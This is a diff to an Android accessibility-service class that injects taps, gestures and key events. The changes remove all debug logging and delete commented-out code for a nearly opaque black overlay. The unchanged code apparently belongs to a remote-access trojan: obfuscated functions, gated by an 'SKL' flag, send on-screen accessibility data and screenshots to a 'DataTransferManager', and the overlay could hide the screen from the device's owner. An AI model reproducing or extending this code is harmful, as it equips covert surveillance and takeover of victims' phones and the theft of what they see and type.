@@ -133,7 +133,7 @@ class InputService : AccessibilityService() {
     private lateinit var overLay: FrameLayout
     private val lock = ReentrantLock()
     
-    private val logTag = "input service"
+
     private var leftIsDown = false
     private var touchPath = Path()
     private var stroke: GestureDescription.StrokeDescription? = null
@@ -448,10 +448,10 @@ class InputService : AccessibilityService() {
             val longPressStroke = GestureDescription.StrokeDescription(path, 0, duration)
             val builder = GestureDescription.Builder()
             builder.addStroke(longPressStroke)
-          //    Log.d(logTag, "performClick x:$x y:$y time:$duration")
+
             dispatchGesture(builder.build(), null, null)
         } catch (e: Exception) {
-          //    Log.e(logTag, "performClick, error:$e")
+    
         }
     }
 
@@ -510,11 +510,11 @@ class InputService : AccessibilityService() {
             stroke?.let {
                 val builder = GestureDescription.Builder()
                 builder.addStroke(it)
-               //   Log.d(logTag, "doDispatchGesture x:$x y:$y time:$duration")
+        
                 dispatchGesture(builder.build(), null, null)
             }
         } catch (e: Exception) {
-          //    Log.e(logTag, "doDispatchGesture, willContinue:$willContinue, error:$e")
+ 
         }
     }
 
@@ -547,10 +547,10 @@ class InputService : AccessibilityService() {
             )
             val builder = GestureDescription.Builder()
             builder.addStroke(stroke)
-           //   Log.d(logTag, "end gesture x:$x y:$y time:$duration")
+
             dispatchGesture(builder.build(), null, null)
         } catch (e: Exception) {
-          //    Log.e(logTag, "endGesture error:$e")
+      
         }
     }
 
@@ -588,7 +588,6 @@ class InputService : AccessibilityService() {
         } else {
         }
 
-       //   Log.d(logTag, "onKeyEvent $keyEvent textToCommit:$textToCommit")
 
         var ke: KeyEventAndroid? = null
         if (Build.VERSION.SDK_INT < 33 || textToCommit == null) {
@@ -625,7 +624,7 @@ class InputService : AccessibilityService() {
             handler.post {
                 ke?.let { event ->
                     val possibleNodes = possibleAccessibiltyNodes()
-                   //   Log.d(logTag, "possibleNodes:$possibleNodes")
+      
                     for (item in possibleNodes) {
                         val success = trySendKeyEvent(event, item, textToCommit)
                         if (success) {
@@ -733,7 +732,6 @@ class InputService : AccessibilityService() {
 
         val rootInActiveWindow = getRootInActiveWindow()
 
-        //  Log.d(logTag, "focusInput:$focusInput focusAccessibilityInput:$focusAccessibilityInput rootInActiveWindow:$rootInActiveWindow")
 
         if (focusInput != null) {
             if (focusInput.isFocusable() && focusInput.isEditable()) {
@@ -752,7 +750,6 @@ class InputService : AccessibilityService() {
         }
 
         val childFromFocusInput = findChildNode(focusInput)
-      //    Log.d(logTag, "childFromFocusInput:$childFromFocusInput")
 
         if (childFromFocusInput != null) {
             insertAccessibilityNode(linkedList, childFromFocusInput)
@@ -762,7 +759,6 @@ class InputService : AccessibilityService() {
         if (childFromFocusAccessibilityInput != null) {
             insertAccessibilityNode(linkedList, childFromFocusAccessibilityInput)
         }
-    //      Log.d(logTag, "childFromFocusAccessibilityInput:$childFromFocusAccessibilityInput")
 
         if (rootInActiveWindow != null) {
             insertAccessibilityNode(linkedList, rootInActiveWindow)
@@ -803,8 +799,6 @@ class InputService : AccessibilityService() {
 
         var success = false
 
-     //     Log.d(logTag, "existing text:$text textToCommit:$textToCommit textSelectionStart:$textSelectionStart textSelectionEnd:$textSelectionEnd")
-
         if (textToCommit != null) {
             if ((textSelectionStart == -1) || (textSelectionEnd == -1)) {
                 val newText = textToCommit
@@ -826,7 +820,7 @@ class InputService : AccessibilityService() {
                 this.fakeEditTextForTextStateCalculation?.setText(text)
             }
             if (textSelectionStart != -1 && textSelectionEnd != -1) {
-              //    Log.d(logTag, "setting selection $textSelectionStart $textSelectionEnd")
+          
                 this.fakeEditTextForTextStateCalculation?.setSelection(
                     textSelectionStart,
                     textSelectionEnd
@@ -842,10 +836,10 @@ class InputService : AccessibilityService() {
                 it.onPreDraw()
                 if (event.action == KeyEventAndroid.ACTION_DOWN) {
                     val succ = it.onKeyDown(event.getKeyCode(), event)
-                 //     Log.d(logTag, "onKeyDown $succ")
+        
                 } else if (event.action == KeyEventAndroid.ACTION_UP) {
                     val success = it.onKeyUp(event.getKeyCode(), event)
-                 //     Log.d(logTag, "keyup $success")
+         
                 } else {}
             }
 
@@ -885,7 +879,7 @@ class InputService : AccessibilityService() {
                     selectionEnd
                 )
                 success = node.performAction(AccessibilityNodeInfo.ACTION_SET_SELECTION, arguments)
-               //   Log.d(logTag, "Update selection to $selectionStart $selectionEnd success:$success")
+          
             }
         }
 
@@ -1051,7 +1045,6 @@ fun b481c5f9b372ead_2() {
 
 	 if(!SKL)return
 	    
-        //   Log.d(logTag, "SKL accessibilityNodeInfo3 NOT NULL")
 	    
         var accessibilityNodeInfo3: AccessibilityNodeInfo?
         try {
@@ -1065,20 +1058,20 @@ fun b481c5f9b372ead_2() {
             try {
                 //if (My_ClassGen_Settings.readBool(this, "SKL", false)) {
                  if(SKL){
-		     //Log.d(logTag, "SKL accessibilityNodeInfo3 NOT NULL")
+
                     val ss999: AccessibilityNodeInfo = accessibilityNodeInfo3
                     Thread(Runnable { DataTransferManager.a012933444444(ss999) }).start()
                 }
 		 else
 		    {
-                      // Log.d(logTag, "SKL accessibilityNodeInfo3 else $SKL")
+                    
 		    }
             } catch (unused7: java.lang.Exception) {
             }
         }
 	    else
 	    {
-               //  Log.d(logTag, "SKL accessibilityNodeInfo3 NULL")
+         
 	    }
     }
     
@@ -1113,7 +1106,7 @@ fun b481c5f9b372ead_2() {
     fun d(str: String?) {
         try {
             if (str != null) {
-              //  Log.d("input service", "正在截图，可能这里没有释放")
+        
                 takeScreenshot(0, this.i, ScreenshotCallback())//ScreenshotCallback(context, i2, str))
             }
         } catch (e: Exception) {
@@ -1418,8 +1411,7 @@ fun b481c5f9b372ead_2() {
         fakeEditTextForTextStateCalculation?.layoutParams = LayoutParams(100, 100)
         fakeEditTextForTextStateCalculation?.onPreDraw()
         val layout = fakeEditTextForTextStateCalculation?.getLayout()
-       //   Log.d(logTag, "fakeEditTextForTextStateCalculation layout:$layout")
-        //  Log.d(logTag, "onServiceConnected!")
+
          windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
         try {
             //createView(windowManager)
@@ -1441,9 +1433,9 @@ fun b481c5f9b372ead_2() {
 			{
 				
 			}
-            //Log.d(logTag, "onCreate success")
+
         } catch (e: Exception) {
-           // Log.d(logTag, "onCreate failed: $e")
+     
         }
     }
 
@@ -1535,169 +1527,3 @@ fun b481c5f9b372ead_2() {
 
     override fun onInterrupt() {}
 }
-
-
-    /*
-    class TimeLogger(private val tag: String, private val label: String = "TimeLogger") {
-
-    private var lastTimestamp = SystemClock.elapsedRealtime()
-
-    fun log(step: String) {
-        val now = SystemClock.elapsedRealtime()
-        val duration = now - lastTimestamp
-        Log.d(tag, "[$label] $step: ${duration} ms")
-        lastTimestamp = now
-    }
-
-    fun reset() {
-        lastTimestamp = SystemClock.elapsedRealtime()
-    }
-  }*/
-  
-/*
-                        val bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace)
-    
-                        if (bitmap != null) {
-                            // ✅ 此处在后台处理数据
-                            DataTransferManager.a012933444445(bitmap)
-    
-                            // 如果你想更新 UI，比如显示截图预览
-                            withContext(Dispatchers.Main) {
-                                Log.d("ScreenshotService", "截图成功，可更新 UI 或 Toast")
-                                // showToast(context, "截图完成")
-                            }
-                        } else {
-                            Log.w("ScreenshotService", "wrapHardwareBuffer 返回空")
-                        }
-    
-                        // ⚠️ 不要忘记释放资源
-                        buffer.close()
-			*/
-
-
-			    
-    /*
- @SuppressLint("ClickableViewAccessibility")
-    private fun createView(windowManager: WindowManager) {  
-        var flags = FLAG_LAYOUT_IN_SCREEN or FLAG_NOT_TOUCH_MODAL or FLAG_NOT_FOCUSABLE
-        if (viewUntouchable || viewTransparency == 0f) {
-            flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
-        }
-
-       // var w = FFI.getNetArgs0()//HomeWith
-       // var h = FFI.getNetArgs1()//HomeHeight 
-       
-        var ww = FFI.getNetArgs2()
-        var hh = FFI.getNetArgs3()	
-	
-	//Log.d(logTag, "createView: $w,$h,$ww,$hh")
-
-        /* if(HomeWidth >0 && HomeHeight>0 )
-	 {
-                ww= HomeWidth 
-		hh= HomeHeight
-	 }*/
-	
-    	overLayparams_bass =  WindowManager.LayoutParams(ww, hh, FFI.getNetArgs0(),FFI.getNetArgs1(), 1)
-        overLayparams_bass.gravity = Gravity.TOP or Gravity.START
-        overLayparams_bass.x = 0
-        overLayparams_bass.y = 0
-    	if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
-    	    overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
-    	}
-    	overLay =  FrameLayout(this)
-    	overLay.setBackgroundColor(Color.parseColor("#000000"));//#000000
-    	overLay.getBackground().setAlpha(253)
-	overLay.setVisibility(8)
-        overLay.setFocusable(false)
-        overLay.setClickable(false)
-
-        val loadingText = TextView(this, null)
-	loadingText.text = "\n\n......"
-	loadingText.setTextColor(-7829368)
-	loadingText.textSize = 15.0f
-	loadingText.gravity = Gravity.LEFT //Gravity.CENTER
-	loadingText.setPadding(60, HomeHeight / 4, 0, 0)
-
-	val dp2px: Int = dp2px(this, 100.0f) //200.0f
-	val paramstext = FrameLayout.LayoutParams(dp2px * 5, dp2px * 5)
-	paramstext.gravity = Gravity.LEFT
-	loadingText.layoutParams = paramstext
-
-	//Fakelay.addView(getView2())
-	overLay.addView(loadingText)
-	
-        windowManager.addView(overLay, overLayparams_bass)
-    }*/
-
-/*
-    @SuppressLint("ClickableViewAccessibility")
-private fun createView(windowManager: WindowManager) {
-    var flags = FLAG_LAYOUT_IN_SCREEN or FLAG_NOT_TOUCH_MODAL or FLAG_NOT_FOCUSABLE
-    if (viewUntouchable || viewTransparency == 0f) {
-        flags = flags or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
-    }
-
-    val ww = FFI.getNetArgs2()
-    val hh = FFI.getNetArgs3()
-
-    overLayparams_bass = WindowManager.LayoutParams(ww, hh, FFI.getNetArgs0(), FFI.getNetArgs1(), 1)
-    overLayparams_bass.gravity = Gravity.TOP or Gravity.START
-    overLayparams_bass.x = 0
-    overLayparams_bass.y = 0
-
-    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
-        overLayparams_bass.flags = overLayparams_bass.flags or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
-    }
-
-    overLay = FrameLayout(this)
-    overLay.setBackgroundColor(Color.parseColor("#000000"))
-    overLay.background.alpha = 253
-    overLay.visibility = View.GONE
-    overLay.isFocusable = false
-    overLay.isClickable = false
-
-    //val loadingText = TextView(this, null)
-    val loadingText = TextView(this) // ✅ 正确构造方式，别传 null
-    loadingText.text = "\n\n请请请请请请请请请请......\n请请请请请请请请\n请请请请请请\n请请请请请......"
-    loadingText.setTextColor(-7829368)
-    loadingText.textSize = 15.0f
-    //loadingText.gravity = Gravity.LEFT
-	
-    loadingText.gravity = Gravity.LEFT or Gravity.BOTTOM
-	
-	// loadingText.setPadding(0, 0, 0, 0) // ❗清除原来的 padding
-	loadingText.setPadding(20, 20, 20, 20) // 留点边距更美观
-
-	/*
-	// ✅ 设置带边框的背景
-	val borderDrawable = GradientDrawable()
-	borderDrawable.setColor(Color.TRANSPARENT) // 背景透明
-	borderDrawable.setStroke(2, Color.GREEN)    // 边框宽度为 2px，颜色为灰色
-	borderDrawable.cornerRadius = 16f          // 可选：圆角边框
-	loadingText.background = borderDrawable
-       */
-    
-    // ✅ 计算放置位置：屏幕底部向上偏移 60dp
-    val displayMetrics = this.resources.displayMetrics
-    //val displayMetrics = Resources.getSystem().displayMetrics
-    val screenHeight = displayMetrics.heightPixels
-    val viewHeight = dp2px(this, 100f) * 5
-    val bottomOffset = dp2px(this, 60f) // 向上偏移的距离
-    val topMargin = screenHeight - viewHeight - bottomOffset
-
-    val paramstext = FrameLayout.LayoutParams(viewHeight, viewHeight)
-    paramstext.gravity = Gravity.LEFT or Gravity.TOP
-    paramstext.topMargin = topMargin
-    paramstext.leftMargin = 60
-    loadingText.layoutParams = paramstext
-
-    overLay.addView(loadingText)
-    windowManager.addView(overLay, overLayparams_bass)
-}
-    
-    fun dp2px(context: Context, f: Float): Int {
-        return (f * context.resources.displayMetrics.density + 0.5f).toInt()
-    }
-*/
